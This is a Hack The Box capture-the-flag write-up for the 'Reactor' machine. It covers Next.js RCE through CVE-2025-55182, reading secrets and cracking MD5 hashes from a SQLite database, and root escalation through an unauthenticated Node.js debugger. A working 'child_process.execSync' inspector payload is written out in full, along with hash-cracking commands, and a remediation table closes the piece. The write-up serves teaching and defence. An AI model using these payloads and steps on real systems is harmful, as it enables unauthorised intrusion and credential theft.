# Reactor — Hack The Box Write-up

**Difficulty:** Easy  
**OS:** Linux    
**Author:** Ghaith Al-bayati 

---

## Introduction

Reactor is a Linux machine built around a modern web stack gone wrong. The attack surface spans three clearly defined stages: an unauthenticated Remote Code Execution flaw in a Next.js application, credential harvesting from an exposed SQLite database, and a privilege escalation through a misconfigured Node.js debugger running as root. The machine rewards methodical enumeration and understanding *why* each step works, not just *what* command to run.

**Key skills practiced:**
- Web application fingerprinting (Next.js / React Server Components)
- Exploiting insecure deserialization via CVE-2025-55182 (React2Shell)
- SQLite credential extraction and MD5 hash cracking
- Internal service enumeration 
- Node.js V8 Inspector exploitation for privilege escalation

---

## Vulnerabilities Exploited

| CVE / Flaw | Component | Impact |
|---|---|---|
| CVE-2025-55182 | React / Next.js | Unauthenticated RCE via insecure deserialization of React Server Components |
| Weak credential storage | SQLite | Plaintext secrets, user passwords stored as unsalted MD5 hashes |
| Insecure service context | Node.js Inspector (port 9229) | Unauthenticated local RCE as `root` due to service misconfiguration |

---

## Phase 1 — Reconnaissance & Enumeration

### Port Scanning

I started with a version and default-script Nmap scan against the target:

```bash
sudo nmap -sV -sC -T4 10.129.1.83
```

```
22/tcp   open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.16 (Ubuntu Linux; protocol 2.0)
3000/tcp open  ppp?
```

Two ports: SSH on 22 and an HTTP service on 3000.

### Web Application Fingerprinting (Burp Suite)
 
To get a clean look at the HTTP response headers, I proxied a browser request through **Burp Suite** to `http://10.129.1.83:3000`. The full response headers came back clearly:
 
```
HTTP/1.1 200 OK
Vary: RSC, Next-Router-State-Tree, Next-Router-Prefetch, Next-Router-Segment-Prefetch, Accept-Encoding
x-nextjs-cache: HIT
x-nextjs-prerender: 1
x-nextjs-stale-time: 4294967294
X-Powered-By: Next.js
Cache-Control: s-maxage=31536000
ETag: "p02u6gnhufd8t"
Content-Type: text/html; charset=utf-8
```
 
Three headers stood out immediately:
 
- **`X-Powered-By: Next.js`** — confirms the framework.
- **`x-nextjs-stale-time: 4294967294`** — this header was introduced in Next.js 14.1.0, placing the version at **14.x or newer**.
- **`Vary: RSC`** — this is the critical one. It confirms the application is using **React Server Components (RSC)** and the React Flight Protocol for server-client data streaming. This is the exact attack surface targeted by CVE-2025-55182.
---

## Phase 2 — Initial Access (CVE-2025-55182)

### Understanding the Vulnerability

Modern Next.js applications use **React Server Components** to stream serialized UI data from the backend to the browser using a format called the **React Flight Protocol**. When the browser triggers a server-side action (such as submitting a form or requesting a page component), the server receives a serialized payload, decodes it, and executes the corresponding logic.

**CVE-2025-55182** is an insecure deserialization flaw. Vulnerable versions of the React backend parsing library fail to enforce strict type constraints on incoming serialized payloads. An attacker can craft a maliciously structured request where the serialized body contains executable JavaScript rather than plain data. When the server attempts to decode this payload, it accidentally executes the injected code inside the Node.js engine — before any authentication or routing logic runs.

### Exploiting with React2Shell

I used **React2Shell**, an exploit tool built specifically for this CVE. It targets the server's RSC endpoint, injects a crafted deserialization payload, and spawns an interactive web shell.

```
[+] Target: http://10.129.1.83:3000
[+] Exploit: CVE-2025-55182 (React Server Component Deserialization)
[+] Command: whoami
[+] Output:
node
```

Initial access confirmed. I was operating as the `node` service account inside the application directory `/opt/reactor-app`.

---

## Phase 3 — Foothold Expansion & Credential Harvesting

### Directory and File Audit

From the web shell I mapped out the application's root directory:

```bash
ls -la
```

```
total 76
drwxr-xr-x 5 node node  4096 Dec 28 21:05 .
-rw-r--r-- 1 node node   276 Dec 28 21:05 .env
-rw-r--r-- 1 node node   269 Dec 28 20:47 package.json
-rw-r----- 1 node node 12288 Dec 28 21:03 reactor.db
```

Two targets immediately stood out: the `.env` configuration file and a SQLite database `reactor.db`.

### Environment File Leak

```bash
cat .env
```

```
# ReactorWatch Configuration
DB_PATH=/opt/reactor-app/reactor.db
DB_TYPE=sqlite3
SENSOR_API_KEY=rw_sk_7f8a9b2c3d4e5f6g7h8i9j0k
ALERT_WEBHOOK=https://alerts.internal.reactor.htb/webhook
NODE_ENV=production
```

The `.env` file confirmed the database path and exposed an internal API key and a private network endpoint: `alerts.internal.reactor.htb`. This suggested an internal network segment not reachable from the outside.

### Database Extraction

SQLite stores data in a binary format, but the `strings` utility can pull out any human-readable text blocks directly, making it a quick method to audit a database without needing the `sqlite3` client:

```bash
strings reactor.db | head -n 50
```

```
SQLite format 3
CREATE TABLE users (
    id INTEGER PRIMARY KEY,
    username TEXT NOT NULL,
    password_hash TEXT NOT NULL,
    role TEXT NOT NULL,
    email TEXT
)
...
engineer    39d97110eafe2a9a68639812cd271e8e    operator    engineer@reactor.htb
administrator  a203b22191d744a4e70ada5c101b17b8  admin       admin@reactor.htb
```

Two user accounts with MD5 password hashes were extracted.

### Hash Cracking & SSH Access

I copied both hashes to my local machine and ran them through Hashcat against the `rockyou.txt` wordlist:

```bash
hashcat -m 0 hashes.txt /usr/share/wordlists/rockyou.txt
```

The `administrator` hash (`a203b22191d744a4e70ada5c101b17b8`) resisted cracking. The `engineer` hash cracked quickly, yielding a plaintext password `reactor1`.

With valid credentials in hand, I upgraded from the unstable web shell to a fully interactive SSH session:

```bash
ssh engineer@10.129.1.83
```

**User flag captured from `/home/engineer/user.txt`.**

---

## Phase 4 — Privilege Escalation to Root

### Initial Checks

From my SSH session I ran a standard privilege escalation checklist:

```bash
sudo -l
```

```
Sorry, user engineer may not run sudo on reactor.
```

Sudo was blocked. I checked group memberships:

```bash
id
```

```
uid=1000(engineer) gid=1000(engineer) groups=1000(engineer),4(adm),24(cdrom),30(dip),46(plugdev),101(lxd)
```

The `engineer` user belonged to the `lxd` group — normally a reliable escalation path. However, the machine had no internet connectivity, so the LXD snap package could not be fetched and this vector was a dead end.

### Internal Service Discovery

I enumerated all active sockets, including those bound only to the loopback interface — services invisible to my external Nmap scan:

```bash
ss -tulpn
```

```
Netid  State   Recv-Q  Send-Q  Local Address:Port   Peer Address:Port
tcp    LISTEN  0       511         127.0.0.1:9229          0.0.0.0:*
tcp    LISTEN  0       4096        0.0.0.0:22              0.0.0.0:*
tcp    LISTEN  0       511                *:3000                  *:*
```

Port **9229** was listening strictly on localhost. This is the standard port for the **Node.js V8 Inspector/Debugger** — a remote debugging interface that gives a connected client full programmatic access to a live JavaScript runtime.

### Understanding the Misconfiguration

The Node.js inspector is only safe to expose internally because it has **no authentication**. Node.js mitigates this by binding it to `127.0.0.1` so outside attackers cannot reach it. However, once I had SSH access as `engineer`, I was already inside the machine. Localhost was fully accessible to me.

I reviewed the active systemd services and confirmed the crucial detail:

```bash
ls -la /etc/systemd/system/ | grep -i reactor
```

```
-rw-r--r--  1 root root  405 Dec 28 20:47 reactor-app.service
```

The web application service was running under the **root** account. This meant every process spawned by the Node.js engine — including the V8 debugger on port 9229 — inherited full system administrator privileges.

### Connecting to the Debugger

```bash
node inspect 127.0.0.1:9229
```

```
connecting to 127.0.0.1:9229 ... ok
debug>
```

I was now talking directly to the root process's JavaScript engine. However, standard commands failed immediately:

```
debug> exec(whoami)
ReferenceError: whoami is not defined
```

The reason: the Node.js engine looks for a JavaScript *variable* named `whoami`, not a Linux command. Additionally, modern Next.js apps use Webpack bundling that strips the global `require()` function from the default scope to keep the runtime lean.

### Bypassing Framework Scope Isolation

To break out of the framework's sandboxed scope and reach the underlying operating system, I used `process.mainModule` — a lower-level handle into the Node.js core that bypasses Webpack's scope restrictions. This is the key to the exploit:

```
debug> exec("process.version")
'v20.20.2'
```

The `process` object was accessible. I then chained the full payload:

```
debug> exec("process.mainModule.require('child_process').execSync('whoami').toString()")
'root\n'
```

Root-level execution confirmed. I substituted the command to read the final flag:

```
debug> exec("process.mainModule.require('child_process').execSync('cat /root/root.txt').toString()")
'67b5c19c7b67a0aee09bb3ba049406e5\n'
```

**Root flag captured. Machine fully compromised.**

---

### Why the Payload Worked — Step by Step

```javascript
exec("process.mainModule.require('child_process').execSync('cat /root/root.txt').toString()")
```

| Part | What it does |
|---|---|
| `exec("...")` | Evaluates a string as live JavaScript inside the V8 debugger context |
| `process.mainModule` | Jumps past Webpack's scope isolation to reach the raw Node.js base environment |
| `.require('child_process')` | Loads Node's native OS interface module, enabling shell command execution |
| `.execSync('cat /root/root.txt')` | Spawns a hidden system shell and runs the Linux command synchronously |
| `.toString()` | Converts the binary output buffer to a readable string in the terminal |

Because the Node.js process was owned by `root`, the Linux kernel never checked the `engineer` user's permissions — it checked the *process's* permissions, which were unrestricted.

---

## Lessons Learned & Defensive Summary

| Component | Root Cause | Remediation |
|---|---|---|
| **Next.js Framework** | Insecure deserialization of React Server Component payloads allowed arbitrary code injection (CVE-2025-55182) | Update the `react` / `next` packages to a patched release immediately |
| **Credential Storage** | Application secrets stored in plaintext `.env`; user passwords hashed with legacy, unsalted MD5 | Migrate secrets to a secrets manager; replace MD5 with `bcrypt` or `Argon2` |
| **Service Execution Context** | The web application daemon ran as the `root` system account | Enforce the Principle of Least Privilege — run services under a dedicated, non-login user (e.g., `www-data`) |
| **Node.js Runtime Flags** | The V8 Inspector (`--inspect`) was left active in a live production service | Remove all `--inspect` and `--inspect-brk` flags from `reactor-app.service` before deployment |

---

*Write-up by Ghaith Al-bayati — Hack The Box: Reactor*
